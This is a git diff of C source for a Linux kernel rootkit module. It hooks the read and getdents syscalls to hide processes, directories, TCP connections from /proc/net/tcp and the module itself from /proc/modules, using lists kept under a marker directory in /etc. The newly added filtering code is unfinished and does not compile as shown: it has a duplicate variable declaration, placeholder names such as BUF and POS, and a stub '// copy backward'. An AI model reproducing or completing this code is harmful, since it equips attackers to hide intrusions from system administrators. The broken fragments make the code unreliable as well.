@@ -16,11 +16,13 @@ atomic_t unlFlag = ATOMIC_INIT (0);
 
 const char *badDirName = "===1234DEADBEAF4321===";
 const char *magicString = "===xxxGANGNAM-STYLExxx===";
+const char *netTcp4String = "/etc/===xxxGANGNAM-STYLExxx===/tcp4.txt";
+const char *modulesString = "/etc/===xxxGANGNAM-STYLExxx===/modules.txt";
 const char *badPath = "/proc";
 const char *netTcpStr1 = "/proc/net/tcp";
 const char *netTcpStr2 = "/proc/self/net/tcp";
 const char *modulesStr = "/proc/modules";
-
+const int strArrSize = 64, lineSize = 200;
 
 //
 // Service functions
@@ -52,6 +54,38 @@ void intToStrRadixDec (char *chBuf, int szBuf, int val) {
 	
 	return;
 }
+
+
+int readFileData (const char *fileName, void *buf, size_t count) {
+	int ret = 0;
+	mm_segment_t oldFs;
+	loff_t posFile = 0;
+	
+	
+	oldFs = get_fs();
+	set_fs (KERNEL_DS);
+	filePtr = filp_open (fileName, O_RDONLY, 0);
+	if (IS_ERR (filePtr)) {
+#ifdef MY_OWN_DEBUG
+		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
+#endif
+		set_fs (oldFs);
+		return 0;
+	}
+	
+	if ((ret = vfs_read (filePtr, buf, count, &posFile)) < 0) {
+#ifdef MY_OWN_DEBUG
+		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+#endif
+		ret = 0;
+	}
+	set_fs (oldFs);
+	filp_close (filePtr, NULL);
+	
+	
+	return ret;
+}
+
 
 //
 // Functions intercepters
@@ -92,7 +126,7 @@ int needHideProc (char *chPtr) {
 #ifdef MY_OWN_DEBUG
 		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
 #endif
-		filp_close (filePtr, current->files);
+		filp_close (filePtr, NULL); // current->files
 		kfree (chBuf);
 		set_fs (oldFs);
 		return 0;
@@ -105,7 +139,7 @@ int needHideProc (char *chPtr) {
 #ifdef MY_OWN_DEBUG
 	if (ret) printk ("Hided: %s - %s\n", chPtr, chBuf);
 #endif
-	filp_close (filePtr, current->files);
+	filp_close (filePtr, NULL);
 	kfree (chBuf);
 	
 	
@@ -126,7 +160,7 @@ int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFla
 			(clrFlag && needHideProc ((char*)&dirPtr->d_type))
 			)
 		{
-			memcpy (dirPtr, tmpPtr, len);
+			memmove (dirPtr, tmpPtr, len);
 			newLen -= cur;
 #ifdef MY_OWN_DEBUG
 			//printk ("Hided: %s\n", (char*)&dirPtr->d_type);
@@ -176,7 +210,7 @@ int isTrustedProcess () {
 #ifdef MY_OWN_DEBUG
 		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
 #endif
-		filp_close (filePtr, current->files);
+		filp_close (filePtr, NULL);
 		kfree (chBuf);
 		set_fs (oldFs);
 		return 0;
@@ -189,7 +223,7 @@ int isTrustedProcess () {
 #ifdef MY_OWN_DEBUG
 	if (ret) printk ("Trusted process");
 #endif
-	filp_close (filePtr, current->files);
+	filp_close (filePtr, NULL);
 	kfree (chBuf);
 	
 	
@@ -259,13 +293,77 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 }
 
 
-int processTcpReading (int fd, void *buf, size_t count) {
-	return 0;
-}
-
-
-int processModulesReading (int fd, void *buf, size_t count) {
-	return 0;
+int processReading (const char *fileName, int fd, void *buf, size_t count) {
+	int ret;
+	char *chpArr [strArrSize], *chBuf, *chBuf1, *chTmp;
+	struct file *filePtr;
+	
+	
+	for (int i = 0; i < strArrSize; ++i) chpArr[i] = NULL;
+	
+	
+	if (!(chBuf = kmalloc (lineSize * strArrSize, GFP_KERNEL))) return 0;
+	if (!(chBuf1 = kmalloc (count + 1, GFP_KERNEL))) {
+		kfree (chBuf);
+		return 0;
+	}
+	if ((ret = readFileData (fileName, chBuf, lineSize * strArrSize - 1)) <= 0) {
+		kfree (chBuf1);
+		kfree (chBuf);
+		return 0;
+	}
+	chTmp = chBuf;
+	for (int i = 0, j = 0; i < ret; ++i) {
+		if (chBuf[i] == '\n') {
+			 chBuf[i] = '\0';
+			 chpArr[j] = chTmp;
+			 ++j;
+			 chTmp = chTmp + strlen (chTmp) + sizeof ('\0');
+			 if (j >= strArrSize) break;
+		}
+	}
+	
+	if ((ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count)) <= 0) {
+		kfree (chBuf1);
+		kfree (chBuf);
+		return ret;
+	}
+	copy_from_user (chBuf1, buf, ret);
+	chBuf1 [ret] = '\0';
+	
+	int i = 0;
+	while (chpArr[i] != NULL) {
+		if ((chTmp = strstr (chBuf1, chpArr[i])) != NULL) {
+			memmove (chTmp,
+					 chTmp + strlen (chpArr[i]) + sizeof ('\n'),
+					 ret - ((size_t)chTmp - (size_t)chBuf1 + 1 + sizeof ('\0'))
+			);
+		}
+		++i;
+	}
+	// we have read a half of a string
+	int i = strlen (chBuf1) - 1;
+	if (ret == count && chBuf[i] != '\n') {
+		if (IS_ERR (filePtr = fget (fd))) {
+			kfree (chBuf1);
+			kfree (chBuf);
+			return 0;
+		}
+		
+		
+		while (chBuf1[i] != '\n') --i;
+		i = strlen (&chBuf1[i]);
+		int j = vfs_read (filePtr, BUF, COUNT, POS);
+		
+		fput (filePtr);
+	}
+	
+	// copy backward
+	kfree (chBuf1);
+	kfree (chBuf);
+	
+	
+	return ret;
 }
 		
 
@@ -293,10 +391,10 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 			fput (fdPtr);
 			
 			if (strstr (netTcpStr1, realPath) || strstr (netTcpStr2, realPath)) {
-				ret = processTcpReading (fd, buf, count);
+				ret = processReading (netTcp4String, fd, buf, count);
 			}
 			else if (strstr (modulesStr, realPath)) {
-				ret = processModulesReading (fd, buf, count);
+				ret = processReading (modulesString, fd, buf, count);
 			}
 			//
 			// Original call
@@ -319,42 +417,8 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 	}
 }
 
-/*
-int newMkdir(const char *pathname, mode_t mode) {
-	int len = strlen_user (pathname);
-	char *chPtr;
-	
-	
-#ifdef MY_OWN_DEBUG
-	printk ("Intercepted function sys_mkdir\n");
-#endif
-	
-	if (oldMkdir) {
-		if (len <= 0) return ENOENT;
-		if ((chPtr = kmalloc (len + 1, GFP_KERNEL)) == NULL) {
-#ifdef MY_OWN_DEBUG
-			printk ("Insufficient of memory, error of kmalloc\n");
-#endif
-			return -ENOMEM;
-		}
-		strncpy_from_user (chPtr, pathname, len);
-		chPtr[len] = '\0';
-		
-		if (strstr (chPtr, badDirName)) {
-#ifdef MY_OWN_DEBUG
-			printk ("Attempt to creat bad directory\n");
-#endif
-			kfree (chPtr);
-			return -EACCES;
-		}
-		kfree (chPtr);
-		return ((MKDIR_P)oldMkdir) (pathname, mode);
-	}
-	else return -EIO;
-}*/
-
 //
-// Service functions od the driver
+// Start/stop functions
 //
 
 void fillServiceTable (void *sscltPtr) {
